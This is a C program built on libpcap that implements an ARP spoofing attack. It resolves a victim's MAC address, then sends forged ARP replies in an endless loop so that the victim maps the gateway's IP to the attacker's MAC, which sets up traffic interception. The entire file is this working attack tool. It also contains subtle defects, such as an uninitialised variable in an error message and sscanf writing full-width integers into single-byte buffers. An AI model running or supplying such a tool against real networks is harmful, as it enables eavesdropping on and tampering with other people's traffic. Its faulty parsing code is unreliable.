#include <pcap/pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//const uint64_t BUF_LEN = 1024;
//const uint64_t IP_STRING_BUF_LEN = 6;
//const uint64_t MAC_STRING_BUF_LEN = 18;

#define BUF_LEN 1024
#define IP_STRING_BUF_LEN 16
#define MAC_STRING_BUF_LEN 18
#define ARP_PACKET_SIZE 60

int getLoalAddrInfo(char *ip_buf, char *mac_buf);
void str2hexMac(char *string_mac, uint8_t *hex_mac);
void str2hexIp(char *string_ip, uint8_t *hex_ip);
void sendArpPacket(pcap_t *p, char * src_mac, char * dest_mac, char *src_ip, char * dest_ip, u_short option);
void errorHandling(char * message);



int main(int argc, char * argv[])
{
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */
	int res;

	struct in_addr local_addr;	// for binary tyoe local ip addr
	
	// sender ip : victim ip
	// target ip : (generally)gateway ip
	if(argc != 4){
		fprintf(stderr, "Usage : %s [interface] [sender IP] [target IP]\n", argv[0]);
		exit(1);
	}

	/* Open the session in promiscuous mode */
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	fprintf(stdout, "[*] interface type\t: %s\n", argv[1]);
	fprintf(stdout, "[*] sender IP addr\t: %s\n", argv[2]);
	fprintf(stdout, "[*] target IP addr\t: %s\n", argv[3]);


	// get local ip, mac addr
	uint8_t local_ip_strbuf[IP_STRING_BUF_LEN] = {0, };
	uint8_t local_mac_strbuf[MAC_STRING_BUF_LEN] = {0, };	
	if(!getLoalAddrInfo(local_ip_strbuf, local_mac_strbuf))
		errorHandling("ERROR OCCURED IN getlocalAddrInfo()\n");

	
	struct ether_header * ether_packet;
	struct ether_arp *arp_packet;
	while(1) {
		sendArpPacket(handle, local_mac_strbuf, "00:00:00:00:00:00", argv[3], argv[2], ARPOP_REQUEST);

		res = pcap_next_ex(handle, &header, &packet);
		if(res == 0)
			continue;
		else if(res == -1)
			errorHandling("an error occurred while reading the packet\n");
		else if(res == -2)
			errorHandling("packets are being read from a ``savefile'' and there are no more packets to read from the savefile");
	
		ether_packet = packet;

		if(ether_packet->ether_type != htons(ETHERTYPE_ARP))
			continue;

		arp_packet = packet + sizeof(struct ether_header);
		uint8_t buf[4] = {0, };
		str2hexIp(argv[2], buf);
		if(memcmp(arp_packet->arp_spa, buf, 4))
			continue;

		if(arp_packet->ea_hdr.ar_op == htons(ARPOP_REPLY))
			break;
		

	}
	char victim_mac_buf[18] = {0, };
	sprintf(victim_mac_buf, "%0x:%0x:%0x:%0x:%0x:%0x", arp_packet->arp_sha[0]
		, arp_packet->arp_sha[1], arp_packet->arp_sha[2], arp_packet->arp_sha[3]
		, arp_packet->arp_sha[4], arp_packet->arp_sha[5]);

	fprintf(stdout, "[*] victim MAC addr\t: %s\n", victim_mac_buf);

	fprintf(stdout, "[-] press 'ctrl + z' to exit\n");
	while(1)
		sendArpPacket(handle, local_mac_strbuf, victim_mac_buf, argv[3], argv[2], ARPOP_REPLY);


	return 0;
}

int getLoalAddrInfo(char *ip_buf, char *mac_buf)
{
	FILE * fp;

	/*	[start] : get local ip address	*/
	// get local ip addr in *.*.*.* format
	fp = popen("ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{print $1}'", "r");
	if(fp == NULL)
		errorHandling("FILE OPEN ERROR IN getlocal_addrInfo (get ip addr)\n");

	if(fgets(ip_buf, IP_STRING_BUF_LEN, fp) == NULL)
		return 0;	// return error code '0' if read error

	pclose(fp);
	/*	[end] : get local ip address	*/

	/*	[start] : get local mac address	*/
	// get local mac addr in *:*:*:*:*:* format
	fp = popen("ifconfig eth0 | grep HWaddr | awk '{print $5}'", "r");
	if(fp == NULL)
		errorHandling("FILE OPEN ERROR IN getlocal_addrInfo (get mac addr)\n");
	if(fgets(mac_buf, MAC_STRING_BUF_LEN, fp) == NULL)
		return 0;	// return error code '0' if read error

	pclose(fp);
	/*	[end] : get local mac address	*/

	printf("[*] local IP addr\t: %s", ip_buf);
	printf("[*] local MAC addr\t: %s\n", mac_buf);

	return 1;	// return success code '1'
}

void str2hexMac(char *string_mac, uint8_t *hex_mac)
{
	if(6 != sscanf(string_mac, "%x:%x:%x:%x:%x:%x", hex_mac, hex_mac + 1 , 
		hex_mac + 2, hex_mac + 3, hex_mac + 4, hex_mac + 5))
		errorHandling("Error Occured in Convert string Mac address to hex Mac addr\n");
}

void str2hexIp(char *string_ip, uint8_t *hex_ip)
{
	if(4 != sscanf(string_ip, "%d.%d.%d.%d", hex_ip, hex_ip + 1 , 
		hex_ip + 2, hex_ip + 3))
		errorHandling("Error Occured in Convert string IP address to hex IP addr\n");
	//printf("<%d.%d.%d.%d>\n", hex_ip[0], hex_ip[1], hex_ip[2], hex_ip[3]);
}

void sendArpPacket(pcap_t *p, char *src_mac_buf, char *dest_mac_buf, char *src_ip_buf, char *dest_ip_buf, u_short option)
{
	struct ether_header* p_eth;
	struct ether_arp* p_arp;

	u_char buf[ARP_PACKET_SIZE] = {0, };
	p_eth = (struct ether_header *)buf;
	p_arp = (struct ether_arp *)(buf + sizeof(struct ether_header));

	// make ether_arp->ea_hdr
	p_arp->ea_hdr.ar_hrd = ntohs(ARPHRD_ETHER);
	p_arp->ea_hdr.ar_pro = ntohs(ETHERTYPE_IP);
	p_arp->ea_hdr.ar_hln = 6;
	p_arp->ea_hdr.ar_pln = 4;
	p_arp->ea_hdr.ar_op = htons(option);

	// convert string type mac address to binary type
	uint8_t src_mac[6];
	str2hexMac(src_mac_buf, src_mac);

	uint8_t dest_mac[6];
	if(option == ARPOP_REQUEST)
		str2hexMac("FF:FF:FF:FF:FF:FF", dest_mac);		
	else
		str2hexMac(dest_mac_buf, dest_mac);

	uint8_t src_ip[4];
	str2hexIp(src_ip_buf, src_ip);

	uint8_t dest_ip[4];
	str2hexIp(dest_ip_buf, dest_ip);


	// make ether_arp's remains
	memcpy(p_arp->arp_sha, src_mac, ETH_ALEN);
	memcpy(p_arp->arp_spa, src_ip, 4);
	memcpy(p_arp->arp_tha, dest_mac, ETH_ALEN);
	memcpy(p_arp->arp_tpa, dest_ip, 4);

	memcpy(p_eth->ether_dhost, dest_mac, 6);
	memcpy(p_eth->ether_shost, src_mac, 6);
	p_eth->ether_type = htons(ETHERTYPE_ARP);


	if(-1 == pcap_sendpacket(p, buf, ARP_PACKET_SIZE))
		errorHandling("Error Occured In pcap_sendpacket");
	else{
		fprintf(stdout, "[*] sending arp request packet\n");
		sleep(1);
	}

}

void errorHandling(char * message)
{
	fprintf(stderr, "[!] %s\n", message);
	exit(1);
}


